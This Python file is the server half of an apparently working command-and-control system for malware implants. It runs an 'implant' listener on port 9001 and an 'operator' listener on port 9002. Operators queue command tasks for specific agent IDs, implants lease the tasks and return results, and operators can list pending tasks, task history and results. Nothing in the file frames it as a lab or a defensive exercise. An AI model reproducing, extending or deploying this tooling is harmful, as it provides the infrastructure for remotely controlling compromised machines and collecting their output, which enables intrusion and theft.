import collections
import socket
import struct
import threading
import time

from protocol import (
    DEFAULT_AGENT_ID,
    MSG_AGENT_GET_TASK,
    MSG_AGENT_POST_RESULT,
    MSG_ERROR,
    MSG_OPERATOR_LIST_HISTORY,
    MSG_OPERATOR_LIST_PENDING,
    MSG_OPERATOR_GET_RESULT,
    MSG_OPERATOR_SUBMIT_TASK,
    MSG_SERVER_ACK,
    MSG_SERVER_NO_TASK,
    MSG_SERVER_PENDING,
    MSG_SERVER_RESULT,
    MSG_SERVER_TASK_HISTORY,
    MSG_SERVER_TASK_LIST,
    MSG_SERVER_TASK,
    MESSAGE_NAMES,
    TASK_STATE_COMPLETED_CODE,
    TASK_STATE_LEASED_CODE,
    TASK_STATE_QUEUED_CODE,
    decode_tlv,
    encode_tlv,
)


IMPLANT_PORT = 9001
OPERATOR_PORT = 9002
LISTEN_HOST = "0.0.0.0"
TASK_LEASE_TIMEOUT_SECONDS = 30

TASK_STATE_QUEUED = "queued"
TASK_STATE_LEASED = "leased"
TASK_STATE_COMPLETED = "completed"

TASK_QUEUE = collections.deque()
TASKS = {}
TASK_LOCK = threading.Lock()
NEXT_TASK_ID = 1


def log_message(prefix, message_type, payload_length, details=""):
    """Print a consistent debug line for each server-side protocol event."""
    timestamp = time.strftime("%H:%M:%S")
    message_name = MESSAGE_NAMES.get(message_type, f"0x{message_type:08X}")
    suffix = f" {details}" if details else ""
    print(
        f"[{timestamp}] [{prefix}] {message_name} "
        f"payload={payload_length}{suffix}"
    )


def get_next_task_id():
    global NEXT_TASK_ID
    task_id = NEXT_TASK_ID
    NEXT_TASK_ID += 1
    return task_id


def requeue_expired_tasks():
    with TASK_LOCK:
        current_time = time.time()
        for task in TASKS.values():
            if task["state"] != TASK_STATE_LEASED:
                continue
            if current_time - task["leased_at"] < TASK_LEASE_TIMEOUT_SECONDS:
                continue
            task["state"] = TASK_STATE_QUEUED
            task["leased_at"] = 0.0
            TASK_QUEUE.append(task)


def lease_next_task(agent_id):
    with TASK_LOCK:
        for task in list(TASK_QUEUE):
            if task["agent_id"] != agent_id:
                continue
            if task["state"] != TASK_STATE_QUEUED:
                continue
            TASK_QUEUE.remove(task)
            task["state"] = TASK_STATE_LEASED
            task["leased_at"] = time.time()
            return task
    return None


def pack_task_payload(task):
    header = struct.pack(
        "<III",
        task["task_id"],
        task["command_id"],
        len(task["arg_bytes"]),
    )
    return header + task["arg_bytes"]


def pack_result_payload(task):
    result_bytes = task.get("result_bytes", b"")
    header = struct.pack(
        "<IIII",
        task["task_id"],
        task["command_id"],
        task["status"],
        len(result_bytes),
    )
    return header + result_bytes


def encode_task_state(task):
    """Convert an internal task state string into a compact wire value."""
    if task["state"] == TASK_STATE_QUEUED:
        return TASK_STATE_QUEUED_CODE
    if task["state"] == TASK_STATE_LEASED:
        return TASK_STATE_LEASED_CODE
    if task["state"] == TASK_STATE_COMPLETED:
        return TASK_STATE_COMPLETED_CODE
    return 0


def pack_pending_task_list():
    """Build a binary list of all currently queued or leased tasks."""
    entries = []

    with TASK_LOCK:
        for task in TASKS.values():
            if task["state"] not in {TASK_STATE_QUEUED, TASK_STATE_LEASED}:
                continue

            entries.append(
                struct.pack(
                    "<IIII",
                    task["task_id"],
                    task["agent_id"],
                    task["command_id"],
                    encode_task_state(task),
                )
            )

    return struct.pack("<I", len(entries)) + b"".join(entries)


def pack_task_history():
    """Build a binary list of all known tasks, including completed ones."""
    entries = []

    with TASK_LOCK:
        for task_id in sorted(TASKS):
            task = TASKS[task_id]
            entries.append(
                struct.pack(
                    "<IIIII",
                    task["task_id"],
                    task["agent_id"],
                    task["command_id"],
                    encode_task_state(task),
                    task.get("status", 0),
                )
            )

    return struct.pack("<I", len(entries)) + b"".join(entries)


def handle_implant_client(client_sock):
    try:
        message = decode_tlv(client_sock)
        if message is None:
            return

        message_type, payload = message
        if message_type != MSG_AGENT_GET_TASK or len(payload) < 4:
            client_sock.sendall(encode_tlv(MSG_ERROR))
            return

        agent_id = struct.unpack("<I", payload[:4])[0]
        log_message("implant", message_type, len(payload), f"agent_id={agent_id}")
        requeue_expired_tasks()
        task = lease_next_task(agent_id)
        if task is None:
            log_message("server", MSG_SERVER_NO_TASK, 0, f"agent_id={agent_id}")
            client_sock.sendall(encode_tlv(MSG_SERVER_NO_TASK))
            return

        log_message(
            "server",
            MSG_SERVER_TASK,
            len(task["arg_bytes"]) + 12,
            (
                f"agent_id={agent_id} task_id={task['task_id']} "
                f"command_id=0x{task['command_id']:08X}"
            ),
        )
        client_sock.sendall(encode_tlv(MSG_SERVER_TASK, pack_task_payload(task)))

        result_message = decode_tlv(client_sock)
        if result_message is None:
            return

        result_type, result_payload = result_message
        log_message("implant", result_type, len(result_payload))
        if result_type != MSG_AGENT_POST_RESULT or len(result_payload) < 20:
            client_sock.sendall(encode_tlv(MSG_ERROR))
            return

        agent_id, task_id, command_id, status, result_length = struct.unpack(
            "<IIIII",
            result_payload[:20],
        )
        result_bytes = result_payload[20:20 + result_length]
        log_message(
            "implant",
            result_type,
            len(result_payload),
            (
                f"agent_id={agent_id} task_id={task_id} "
                f"command_id=0x{command_id:08X} status=0x{status:08X}"
            ),
        )

        with TASK_LOCK:
            task = TASKS.get(task_id)
            if task is not None:
                task["agent_id"] = agent_id
                task["command_id"] = command_id
                task["status"] = status
                task["result_bytes"] = result_bytes
                task["state"] = TASK_STATE_COMPLETED
                task["completed_at"] = time.time()

        log_message("server", MSG_SERVER_ACK, 4, f"task_id={task_id}")
        client_sock.sendall(encode_tlv(MSG_SERVER_ACK, struct.pack("<I", task_id)))
    finally:
        client_sock.close()


def handle_operator_client(client_sock):
    try:
        message = decode_tlv(client_sock)
        if message is None:
            return

        message_type, payload = message
        if message_type == MSG_OPERATOR_SUBMIT_TASK:
            if len(payload) < 12:
                client_sock.sendall(encode_tlv(MSG_ERROR))
                return

            agent_id, command_id, arg_length = struct.unpack("<III", payload[:12])
            arg_bytes = payload[12:12 + arg_length]
            log_message(
                "operator",
                message_type,
                len(payload),
                (
                    f"agent_id={agent_id} "
                    f"command_id=0x{command_id:08X} arg_length={arg_length}"
                ),
            )

            with TASK_LOCK:
                task_id = get_next_task_id()
                task = {
                    "task_id": task_id,
                    "agent_id": agent_id,
                    "command_id": command_id,
                    "arg_bytes": arg_bytes,
                    "status": 0,
                    "result_bytes": b"",
                    "state": TASK_STATE_QUEUED,
                    "leased_at": 0.0,
                    "completed_at": 0.0,
                }
                TASKS[task_id] = task
                TASK_QUEUE.append(task)

            log_message(
                "server",
                MSG_SERVER_ACK,
                4,
                (
                    f"task_id={task_id} agent_id={agent_id} "
                    f"command_id=0x{command_id:08X}"
                ),
            )
            client_sock.sendall(encode_tlv(MSG_SERVER_ACK, struct.pack("<I", task_id)))
            return

        if message_type == MSG_OPERATOR_GET_RESULT:
            if len(payload) < 4:
                client_sock.sendall(encode_tlv(MSG_ERROR))
                return

            task_id = struct.unpack("<I", payload[:4])[0]
            log_message("operator", message_type, len(payload), f"task_id={task_id}")
            with TASK_LOCK:
                task = TASKS.get(task_id)

            if task is None:
                client_sock.sendall(encode_tlv(MSG_ERROR))
                return

            if task["state"] != TASK_STATE_COMPLETED:
                log_message(
                    "server",
                    MSG_SERVER_PENDING,
                    4,
                    f"task_id={task_id} state={task['state']}",
                )
                client_sock.sendall(
                    encode_tlv(MSG_SERVER_PENDING, struct.pack("<I", task_id))
                )
                return

            log_message(
                "server",
                MSG_SERVER_RESULT,
                len(task.get("result_bytes", b"")) + 16,
                f"task_id={task_id} status=0x{task['status']:08X}",
            )
            client_sock.sendall(encode_tlv(MSG_SERVER_RESULT, pack_result_payload(task)))
            return

        if message_type == MSG_OPERATOR_LIST_PENDING:
            log_message("operator", message_type, len(payload), "pending_tasks_snapshot")
            pending_payload = pack_pending_task_list()
            log_message(
                "server",
                MSG_SERVER_TASK_LIST,
                len(pending_payload),
                "pending_tasks_snapshot",
            )
            client_sock.sendall(encode_tlv(MSG_SERVER_TASK_LIST, pending_payload))
            return

        if message_type == MSG_OPERATOR_LIST_HISTORY:
            log_message("operator", message_type, len(payload), "task_history_snapshot")
            history_payload = pack_task_history()
            log_message(
                "server",
                MSG_SERVER_TASK_HISTORY,
                len(history_payload),
                "task_history_snapshot",
            )
            client_sock.sendall(encode_tlv(MSG_SERVER_TASK_HISTORY, history_payload))
            return

        client_sock.sendall(encode_tlv(MSG_ERROR))
    finally:
        client_sock.close()


def accept_loop(server_sock, handler):
    while True:
        client_sock, _addr = server_sock.accept()
        thread = threading.Thread(target=handler, args=(client_sock,), daemon=True)
        thread.start()


def main():
    implant_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    operator_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    implant_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    operator_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    implant_server.bind((LISTEN_HOST, IMPLANT_PORT))
    operator_server.bind((LISTEN_HOST, OPERATOR_PORT))

    implant_server.listen(5)
    operator_server.listen(5)

    print(f"[*] Implant task server listening on {IMPLANT_PORT}")
    print(f"[*] Operator task server listening on {OPERATOR_PORT}")
    print(f"[*] Default agent id: {DEFAULT_AGENT_ID}")

    implant_thread = threading.Thread(
        target=accept_loop,
        args=(implant_server, handle_implant_client),
        daemon=True,
    )
    operator_thread = threading.Thread(
        target=accept_loop,
        args=(operator_server, handle_operator_client),
        daemon=True,
    )
    implant_thread.start()
    operator_thread.start()

    try:
        while True:
            time.sleep(1.0)
    except KeyboardInterrupt:
        pass
    finally:
        implant_server.close()
        operator_server.close()


if __name__ == "__main__":
    main()
